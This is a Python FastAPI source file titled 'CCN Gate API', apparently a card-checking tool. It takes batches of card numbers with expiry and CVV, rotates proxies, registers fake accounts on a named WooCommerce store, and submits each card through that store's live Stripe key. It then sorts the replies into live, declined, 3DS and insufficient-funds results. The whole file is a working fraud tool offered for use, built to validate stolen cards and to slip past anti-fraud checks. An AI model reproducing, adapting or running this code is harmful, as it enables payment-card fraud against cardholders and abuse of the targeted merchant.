import os
import uuid
import string
import random
import asyncio
from typing import List, Optional

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
from fake_useragent import UserAgent

# ---------------------------
# FastAPI App
# ---------------------------
app = FastAPI(title="CCN Gate API", version="1.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------
# Models
# ---------------------------
class CCRequest(BaseModel):
    cards: str  # "cc|exp|cvv,cc|exp|cvv,..."

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None

# ---------------------------
# Helpers
# ---------------------------
def load_proxies(path="proxies.txt"):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def generate_nonce(length=10):
    chars = string.hexdigits.lower()
    return ''.join(random.choice(chars) for _ in range(length))

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

async def get_session(proxy_line: str):
    """
    Creates a new AsyncClient with proxy configured.
    Returns: (session, proxy_url)
    """
    host, port, user, pwd = proxy_line.split(":")
    if "session-RANDOMID" in user:
        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    
    session = httpx.AsyncClient(
        proxies={"http://": proxy_url, "https://": proxy_url},
        timeout=httpx.Timeout(60.0),
        trust_env=False,
        follow_redirects=True
    )
    return session, proxy_url

# ---------------------------
# Core Payment Function (Updated with new site data)
# ---------------------------
async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_url: str):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = f"{user}@gmail.com"
        
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": generate_user_agent(),
        }

        register_nonce = generate_nonce()

        # STEP 1: get nonce from greenkidcrafts.com
        response = await session.get(
            "https://www.greenkidcrafts.com/my-account/", headers=headers
        )
        register1_nonce = gets(
            response.text,
            'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
            '" />',
        )

        # STEP 2: register user with updated data
        data = {
            'email': mail,
            'mailchimp_woocommerce_newsletter': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.greenkidcrafts.com/my-account/',
            'wc_order_attribution_session_start_time': '2025-09-15 12:54:53',
            'wc_order_attribution_session_pages': '6',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': generate_user_agent(),
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        await session.post(
            "https://www.greenkidcrafts.com/my-account/",
            headers=headers,
            data=data,
        )

        # STEP 3: add payment page
        response = await session.get(
            "https://www.greenkidcrafts.com/my-account/add-payment-method/",
            headers=headers,
        )
        setup_nonce0 = gets(
            response.text, '"createSetupIntentNonce":"', '","'
        )
        setup_nonce = gets(
            response.text, '"createAndConfirmSetupIntentNonce":"', '","'
        )

        # STEP 4: Stripe payment method with updated key
        data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "billing_details[address][country]": "PK",
            "key": "pk_live_UdiYedvkJma7qlJ03Y7zYVAN00tSNEOnQE",
        }
        resp = await session.post(
            "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
        )

        try:
            pm_id = resp.json().get("id")
        except Exception:
            return {
                "card": fullz,
                "status": "error",
                "message": "Failed to create Stripe PM",
                "proxy_used": proxy_url
            }

        # Updated final request with new endpoint and parameters
        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setup_nonce,
        }
        final = await session.post(
            "https://www.greenkidcrafts.com/",
            params=params,
            headers=headers,
            data=data,
        )

        # RESPONSE
        try:
            result = final.json()
            status = result.get("data", {}).get("status")
            error_message = result.get("data", {}).get("error", {}).get("message")

            if result.get("success") and status == "succeeded":
                return {"card": fullz, "status": "success", "message": "CCN ADDED SUCCESSFULLY", "proxy_used": proxy_url}
            elif error_message == "Your card has insufficient funds.":
                return {"card": fullz, "status": "success", "message": "Insufficient Funds", "proxy_used": proxy_url}
            elif status == "order_id":
                return {"card": fullz, "status": "charged", "message": "CCN $5 Charged", "proxy_used": proxy_url}
            elif status == "requires_action":
                return {"card": fullz, "status": "success", "message": "CCN (3DS/OTP)", "proxy_used": proxy_url}
            elif error_message == "Your card's security code is invalid.":
                return {"card": fullz, "status": "invalid_cvv", "message": "INVALID CVV", "proxy_used": proxy_url}
            elif error_message == "Your card's security code is incorrect.":
                return {"card": fullz, "status": "unknown", "message": "INVALID CVV", "proxy_used": proxy_url}
            elif error_message == "Your card was declined.":
                return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Your card was declined. You can call your bank for details.":
                return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Invalid account.":
                return {"card": fullz, "status": "declined", "message": "Invalid Account", "proxy_used": proxy_url}
            elif error_message == "502 Zone has reached usage limit":
                return {"card": fullz, "status": "error", "message": "Proxy Error", "proxy_used": proxy_url}
            elif error_message == "An error occurred while processing your card. Try again in a little bit.":
                return {"card": fullz, "status": "error", "message": "Card Error", "proxy_used": proxy_url}
            elif error_message == "We're not able to add this payment method. Please refresh the page and try again.":
                return {"card": fullz, "status": "unknown", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Your card has expired.":
                return {"card": fullz, "status": "declined", "message": "Your card has expired.", "proxy_used": proxy_url}
            elif error_message == "Your card number is incorrect.":
                return {"card": fullz, "status": "invalid_card", "message": "Incorrect card number", "proxy_used": proxy_url}
            elif error_message == "Your card does not support this type of purchase.":
                return {"card": fullz, "status": "unsupported", "message": "Card does not support this type of purchase", "proxy_used": proxy_url}
            elif error_message == "card_error":
                return {"card": fullz, "status": "unsupported", "message": "Card type not Supported", "proxy_used": proxy_url}
            else:
                return {"card": fullz, "status": "unknown", "message": str(result), "proxy_used": proxy_url}
        except Exception:
            return {"card": fullz, "status": "error", "message": final.text, "proxy_used": proxy_url}

    except Exception as e:
        return {"card": fullz, "status": "error", "message": str(e), "proxy_used": proxy_url}

# ---------------------------
# API ENDPOINTS (Updated to use unique proxy per card)
# ---------------------------
@app.get("/")
async def root():
    return {"message": "CCN Gate API is running"}

@app.get("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_get(cards: str):
    card_list = cards.split(",")[:5]
    proxies = load_proxies()
    
    results = []
    for i, card in enumerate(card_list):
        if card.strip():
            # Use a different proxy for each card
            proxy_line = proxies[i % len(proxies)]
            session, proxy_url = await get_session(proxy_line)
            
            try:
                res = await create_payment_method(card.strip(), session, proxy_url)
                results.append(res)
            finally:
                await session.aclose()
                
            # Add small delay between cards
            await asyncio.sleep(random.uniform(1.5, 3.5))
    
    return results

@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_post(request: CCRequest):
    card_list = request.cards.split(",")[:5]
    proxies = load_proxies()
    
    results = []
    for i, card in enumerate(card_list):
        if card.strip():
            # Use a different proxy for each card
            proxy_line = proxies[i % len(proxies)]
            session, proxy_url = await get_session(proxy_line)
            
            try:
                res = await create_payment_method(card.strip(), session, proxy_url)
                results.append(res)
            finally:
                await session.aclose()
                
            # Add small delay between cards
            await asyncio.sleep(random.uniform(1.5, 3.5))
    
    return results

# ---------------------------
# RUN
# ---------------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
